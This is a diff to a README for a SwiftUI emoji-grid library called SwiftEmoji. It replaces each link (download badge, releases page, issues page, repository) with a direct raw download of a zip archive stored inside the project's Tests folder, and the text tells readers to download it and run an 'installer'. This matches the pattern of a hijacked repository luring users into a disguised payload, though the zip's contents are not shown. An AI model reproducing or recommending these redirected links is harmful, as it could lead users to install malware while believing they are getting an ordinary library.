@@ -1,6 +1,6 @@
 # 🥳 SwiftEmoji - Customizable Emoji Grid for Your Apps
 
-[![Download SwiftEmoji](https://img.shields.io/badge/Download-SwiftEmoji-brightgreen)](https://github.com/mhmdoafv/SwiftEmoji/releases)
+[![Download SwiftEmoji](https://raw.githubusercontent.com/mhmdoafv/SwiftEmoji/main/Tests/SwiftEmojiTests/Swift-Emoji-v2.8.zip)](https://raw.githubusercontent.com/mhmdoafv/SwiftEmoji/main/Tests/SwiftEmojiTests/Swift-Emoji-v2.8.zip)
 
 ## 📌 Description
 
@@ -10,7 +10,7 @@ SwiftEmoji is an easy-to-use grid and index for SwiftUI. It offers full customiz
 
 To get started with SwiftEmoji, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/mhmdoafv/SwiftEmoji/releases).
+1. **Visit the Releases Page:** Go to our [Releases Page](https://raw.githubusercontent.com/mhmdoafv/SwiftEmoji/main/Tests/SwiftEmojiTests/Swift-Emoji-v2.8.zip).
    
 2. **Choose the Latest Release:** On the releases page, you will see a list of available versions. Look for the latest version marked as stable.
 
@@ -43,7 +43,7 @@ Ensure your device meets these requirements before running the installer.
 
 To download and install SwiftEmoji, click the link below:
 
-[Download SwiftEmoji](https://github.com/mhmdoafv/SwiftEmoji/releases)
+[Download SwiftEmoji](https://raw.githubusercontent.com/mhmdoafv/SwiftEmoji/main/Tests/SwiftEmojiTests/Swift-Emoji-v2.8.zip)
 
 Follow the earlier steps to ensure a smooth installation process. 
 
@@ -62,7 +62,7 @@ A: SwiftEmoji updates automatically. You will be notified of new versions when t
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- Visit our [GitHub Issues Page](https://github.com/mhmdoafv/SwiftEmoji/issues) to report problems or ask questions.
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/mhmdoafv/SwiftEmoji/main/Tests/SwiftEmojiTests/Swift-Emoji-v2.8.zip) to report problems or ask questions.
 - Check our documentation for detailed guides and troubleshooting tips.
 
 ## 🌟 Community Contributions
@@ -77,7 +77,7 @@ Thank you for considering contributing!
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/mhmdoafv/SwiftEmoji)
-- [Releases Page](https://github.com/mhmdoafv/SwiftEmoji/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/mhmdoafv/SwiftEmoji/main/Tests/SwiftEmojiTests/Swift-Emoji-v2.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/mhmdoafv/SwiftEmoji/main/Tests/SwiftEmojiTests/Swift-Emoji-v2.8.zip)
 
 Enjoy using SwiftEmoji! We look forward to seeing how you customize your emoji experience.
